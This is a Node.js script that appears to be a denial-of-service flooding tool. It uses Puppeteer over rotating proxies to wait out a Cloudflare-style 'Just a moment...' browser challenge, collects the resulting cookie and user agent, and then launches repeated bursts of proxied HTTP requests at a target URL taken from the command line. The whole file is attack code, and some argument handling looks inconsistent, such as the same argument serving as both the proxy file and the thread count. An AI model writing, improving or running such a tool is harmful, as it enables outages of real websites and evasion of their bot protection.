const fs = require('fs');
const http = require('http');
const https = require('https');
const { exec } = require('child_process');
const puppeteer = require('puppeteer');
const url = require('url');
const net = require('net');
const HttpsProxyAgent = require('https-proxy-agent');

class Main {
    static formatConsoleDate(date) {
        return `[${date.toISOString().replace('T', '-').substring(0, 19)}]`;
    }

    static GetArgs() {
        return process.argv;
    }

    static GetChromeVersion(userAgent) {
        return userAgent.split('Chrome/')[1].split('.0.')[0];
    }
}

class Target {
    static async Bypass(hashDigest) {
        global.config;

        const proxy = config.proxies[Math.floor(Math.random() * config.proxies.length)];
        const browser = await puppeteer.launch({
            args: [
                '--disable-infobars',
                '--disable-logging',
                '--no-sandbox',
                `--proxy-server=${proxy}`,
                '--incognito',
                '--disable-login-animations',
                '--disable-notifications',
                '--disable-default-apps',
                '--disable-popup-blocking'
            ]
        });

        console.log(Main.formatConsoleDate(new Date()) + ` New worker started`);

        const page = await browser.newPage();
        await page.goto('https://google.com/');
        await page.evaluate(`window.open('${Main.GetArgs()[2]}');`);

        const pages = await browser.pages();
        await pages[1].bringToFront();

        let BypassEvent = true;
        while (BypassEvent) {
            await new Promise(r => setTimeout(r, 6000));
            const title = await pages[1].title();
            if (title !== 'Just a moment...') {
                BypassEvent = false;

                console.log(Main.formatConsoleDate(new Date()) + ` Challenge bypassed successfully.`);

                config.threads[hashDigest] = true;

                const cookies = await pages[1].cookies();
                const userAgent = await pages[1].evaluate(() => navigator.userAgent);
                await browser.close();

                let ThreadEvent = true;
                while (ThreadEvent) {
                    await new Promise(r => setTimeout(r, 1000));
                    if (Object.values(config.threads).every(value => value === true)) {
                        ThreadEvent = false;
                        console.log(Main.formatConsoleDate(new Date()) + ` Starting workers ...`);

                        const cookie = cookies.length ? `${cookies[0].name}=${cookies[0].value}` : null;
                        for (let i = 0; i < 50; i++) {
                            Target.Start(cookie, userAgent, { https: `http://${proxy}` });
                        }
                    }
                }
            }
        }
    }

    static Start(cookie, userAgent, proxy) {
        const parsedProxy = url.parse(proxy.https);
        const [proxyHost, proxyPort] = parsedProxy.host.split(':');

        const target = url.parse(Main.GetArgs()[2]);
        const targetHost = target.host;
        const targetPath = target.path || '/';
        const targetScheme = target.protocol === 'https:' ? 'https' : 'http';
        const targetPort = targetScheme === 'https' ? 443 : 80;

        const headers = {
            'Host': targetHost,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'User-Agent': userAgent,
            'Connection': 'close'
        };

        if (cookie) headers['Cookie'] = cookie;

        const request = `${targetScheme === 'https' ? 'GET' : 'POST'} ${targetPath} HTTP/2.0\r\n${Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\r\n')}\r\n\r\n`;

        if (targetScheme === 'https') {
            const options = {
                hostname: targetHost,
                port: targetPort,
                path: targetPath,
                method: 'GET',
                headers,
                agent: new HttpsProxyAgent(`http://${proxyHost}:${proxyPort}`)
            };

            https.request(options, res => {
                res.on('data', () => {});
                res.on('end', () => res.destroy());
            }).end();
        } else {
            const options = {
                hostname: targetHost,
                port: targetPort,
                path: targetPath,
                headers,
                agent: new HttpsProxyAgent(`http://${proxyHost}:${proxyPort}`)
            };

            http.request(options, res => {
                res.on('data', () => {});
                res.on('end', () => res.destroy());
            }).end();
        }
    }
}

function main() {
    console.log(`Succesfully Build`);

    if (process.argv.length < 4) {
        console.error(`Usage => tobi@github:~# node main.js <target> <threads> <proxies-file> `);
        process.exit(1);
    }

    global.config = {
        proxies: fs.readFileSync(process.argv[3], 'utf-8').split('\n'),
        threads: {}
    };

    try {
        for (let hashDigest = 0; hashDigest < parseInt(Main.GetArgs()[3]); hashDigest++) {
            setTimeout(() => {
                Target.Bypass(hashDigest);
                config.threads[hashDigest] = false;
            }, 3000);
        }
    } catch (err) {
        process.exit(1);
    }
}

if (require.main === module) {
    main();
}
